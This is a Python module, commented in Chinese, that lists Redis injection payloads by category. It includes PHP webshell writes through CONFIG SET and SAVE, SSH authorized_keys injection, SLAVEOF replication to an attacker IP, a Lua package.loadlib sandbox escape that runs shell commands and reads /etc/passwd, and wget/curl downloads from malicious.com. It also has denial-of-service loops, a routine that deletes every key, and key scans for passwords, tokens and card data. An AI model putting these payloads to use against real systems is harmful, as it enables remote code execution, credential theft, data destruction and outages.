"""
Redis注入载荷模块
包含用于Redis命令注入的各种类型载荷
"""

# Redis 基本命令载荷
BASIC_COMMANDS_PAYLOADS = [
    # 服务器信息获取
    "INFO",
    "INFO server",
    "INFO clients",
    "INFO memory",
    "INFO persistence",
    "INFO stats",
    "INFO replication",
    "INFO cpu",
    "INFO commandstats",
    "INFO cluster",
    "INFO keyspace",
    
    # 系统级命令
    "CLIENT LIST",
    "CLIENT GETNAME",
    "CONFIG GET *",
    "CONFIG GET dir",
    "CONFIG GET dbfilename",
    "TIME",
    "LASTSAVE",
    "DBSIZE",
    "MONITOR",
    "SLOWLOG GET 10",
    "CLUSTER INFO",
]

# Redis 枚举命令载荷
ENUMERATION_PAYLOADS = [
    # 键空间扫描
    "KEYS *",
    "SCAN 0 COUNT 1000", 
    "SCAN 0 MATCH *secret* COUNT 100",
    "SCAN 0 MATCH *pass* COUNT 100",
    "SCAN 0 MATCH *user* COUNT 100",
    "SCAN 0 MATCH *admin* COUNT 100",
    "SCAN 0 MATCH *key* COUNT 100",
    "SCAN 0 MATCH *token* COUNT 100",
    "SCAN 0 MATCH *auth* COUNT 100",
    "SCAN 0 MATCH *config* COUNT 100",
    
    # 数据库枚举
    "SELECT 0", "SELECT 1", "SELECT 2", "SELECT 3",
    "RANDOMKEY",
    "DBSIZE",
    
    # 服务器信息
    "CONFIG GET *",
    "CONFIG GET protected-mode",
    "CONFIG GET port",
    "CONFIG GET bind",
    "CONFIG GET dir",
    "CONFIG GET dbfilename",
    "CONFIG GET requirepass",
    "CONFIG GET masterauth",
    "CONFIG GET maxclients",
    "MODULE LIST",
]

# Redis 数据修改命令载荷
DATA_MODIFICATION_PAYLOADS = [
    # 字符串操作
    "SET <key> <value>",
    "APPEND <key> <value>",
    "INCR <key>",
    "DECR <key>",
    "GETSET <key> <value>",
    
    # 列表操作
    "LPUSH <key> <value>",
    "RPUSH <key> <value>",
    "LPOP <key>",
    "RPOP <key>",
    "LRANGE <key> 0 -1",
    
    # 哈希表操作
    "HSET <key> <field> <value>",
    "HGET <key> <field>",
    "HMSET <key> <field1> <value1> <field2> <value2>",
    "HGETALL <key>",
    
    # 集合操作
    "SADD <key> <member>",
    "SMEMBERS <key>",
    "SREM <key> <member>",
    
    # 有序集合操作
    "ZADD <key> <score> <member>",
    "ZRANGE <key> 0 -1",
    "ZREM <key> <member>",
    
    # 键操作
    "DEL <key>",
    "EXPIRE <key> <seconds>",
    "RENAME <key> <newkey>",
]

# Redis Web应用攻击载荷
WEB_ATTACK_PAYLOADS = [
    # PHP Web Shell
    'EVAL "return shell_exec(\'id\')" 0',
    'EVAL "return shell_exec(\'ls -la\')" 0',
    'EVAL "return shell_exec(\'cat /etc/passwd\')" 0',
    'EVAL "return shell_exec(\'ifconfig\')" 0',
    'EVAL "return shell_exec(\'netstat -an\')" 0',
    'EVAL "return shell_exec(\'ps aux\')" 0',
    'EVAL "return shell_exec(\'wget http://malicious.com/shell.php -O /tmp/shell.php\')" 0',
    'EVAL "return shell_exec(\'curl http://malicious.com/shell.php -o /tmp/shell.php\')" 0',
    
    # Redis Lua脚本攻击
    'EVAL "redis.call(\'set\',\'backdoor\',\'<?php system($_REQUEST[\\\'cmd\\\']); ?>\')" 0',
    'EVAL "redis.call(\'config\',\'set\',\'dir\',\'/var/www/html/\')" 0',
    'EVAL "redis.call(\'config\',\'set\',\'dbfilename\',\'shell.php\')" 0',
    'EVAL "redis.call(\'save\')" 0',
    
    # 文件操作攻击
    'CONFIG SET dir /var/www/html/',
    'CONFIG SET dbfilename shell.php',
    'SET backdoor "<?php system($_REQUEST[\'cmd\']); ?>"',
    'SAVE',
    
    # SSH密钥写入攻击
    'CONFIG SET dir /home/user/.ssh/',
    'CONFIG SET dbfilename authorized_keys',
    'SET backdoor "ssh-rsa AAAAB3NzaC1yc2E...攻击者的SSH公钥..."',
    'SAVE',
    
    # 主从复制攻击
    'SLAVEOF <攻击者IP> <攻击者端口>',
    'SLAVEOF NO ONE',
]

# Redis 信息泄露载荷
INFORMATION_DISCLOSURE_PAYLOADS = [
    # 配置信息
    "CONFIG GET *",
    "CONFIG GET requirepass",
    "CONFIG GET masterauth",
    "CONFIG GET masteruser",
    "CONFIG GET bind",
    "CONFIG GET protected-mode",
    "CONFIG GET dir",
    "CONFIG GET dbfilename",
    "CONFIG GET logfile",
    "CONFIG GET pidfile",
    
    # 敏感数据查找
    "KEYS *password*",
    "KEYS *secret*",
    "KEYS *token*",
    "KEYS *key*",
    "KEYS *user*",
    "KEYS *admin*",
    "KEYS *login*",
    "KEYS *credential*",
    "KEYS *credit*card*",
    "KEYS *api*",
    
    # 会话和用户数据
    "KEYS *session*",
    "KEYS *jwt*",
    "KEYS *oauth*",
    "KEYS *cookie*",
    "KEYS *auth*",
    "KEYS *access*",
]

# Redis 拒绝服务攻击载荷
DENIAL_OF_SERVICE_PAYLOADS = [
    # 占用内存
    "SET dos_large_key <large_value>",  # 使用大值填充
    "SET dos_key 1; APPEND dos_key <large_value>",  # 逐渐增加大值
    
    # 使用EVAL执行无限循环
    'EVAL "local i = 0; while true do i = i + 1 end" 0',
    'EVAL "while(1) do redis.call(\'ping\') end" 0',
    
    # 占用磁盘空间
    "CONFIG SET dir /tmp/",
    "CONFIG SET dbfilename dos.rdb",
    "SET dos_key <large_value>",
    "BGSAVE",
    
    # 大量键创建
    "EVAL \"for i=1,500000 do redis.call(\'set\', \'dos_\'..i, i) end\" 0",
    
    # 命令阻塞
    "KEYS *",  # 在大型数据库上阻塞
    "SMEMBERS <large_set>",  # 在大型集合上阻塞
    "LRANGE <large_list> 0 -1",  # 在大型列表上阻塞
    "HGETALL <large_hash>",  # 在大型哈希表上阻塞
]

# Redis URL注入载荷 (Redis协议)
URL_INJECTION_PAYLOADS = [
    # 基础URL格式
    "redis://host:port/dbnum?key=value",
    "redis://host:port/dbnum",
    "redis://:password@host:port/dbnum",
    "redis://user:password@host:port/dbnum",
    
    # 攻击载荷
    "redis://attacker.com:6379/0",
    "redis://:@localhost:6379/0?key=FLUSHALL",
    "redis://evil_user:evil_password@localhost:6379/0",
]

# Redis SSH密钥注入载荷
SSH_KEY_INJECTION_PAYLOADS = [
    # 步骤1: 设置目录
    "CONFIG SET dir /home/target_user/.ssh/",
    
    # 步骤2: 设置输出文件名
    "CONFIG SET dbfilename authorized_keys",
    
    # 步骤3: 设置密钥内容
    "SET ssh_backdoor \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAA...攻击者的SSH公钥...\"",
    
    # 步骤4: 保存到磁盘
    "SAVE",
    
    # 完整的一行命令攻击
    "CONFIG SET dir /home/target_user/.ssh/; CONFIG SET dbfilename authorized_keys; SET ssh_backdoor \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAA...\"; SAVE;"
]

# Redis LUA脚本注入载荷
LUA_INJECTION_PAYLOADS = [
    # 基本命令执行
    'EVAL "return redis.call(\'INFO\')" 0',
    'EVAL "return redis.call(\'CONFIG\', \'GET\', \'*\')" 0',
    'EVAL "for _,k in ipairs(redis.call(\'KEYS\', \'*\')) do redis.call(\'DEL\', k) end; return 1" 0',  # 删除所有键
    
    # 系统命令执行 (仅限特定版本或配置的Redis)
    'EVAL "local io_l = package.loadlib(\\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\", \\\"luaopen_io\\\"); local io = io_l(); local f = io.popen(\\\"id\\\", \\\"r\\\"); local res = f:read(\\\"*a\\\"); f:close(); return res" 0',
    'EVAL "local io_l = package.loadlib(\\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\", \\\"luaopen_io\\\"); local io = io_l(); local f = io.popen(\\\"ls -la\\\", \\\"r\\\"); local res = f:read(\\\"*a\\\"); f:close(); return res" 0',
    
    # 文件操作
    'EVAL "local io_l = package.loadlib(\\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\", \\\"luaopen_io\\\"); local io = io_l(); local f = io.open(\\\"/etc/passwd\\\", \\\"r\\\"); local res = f:read(\\\"*a\\\"); f:close(); return res" 0',
    'EVAL "local io_l = package.loadlib(\\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\", \\\"luaopen_io\\\"); local io = io_l(); local f = io.open(\\\"/tmp/hacked.txt\\\", \\\"w\\\"); f:write(\\\"system hacked\\\"); f:close(); return \\\"ok\\\"" 0',
] 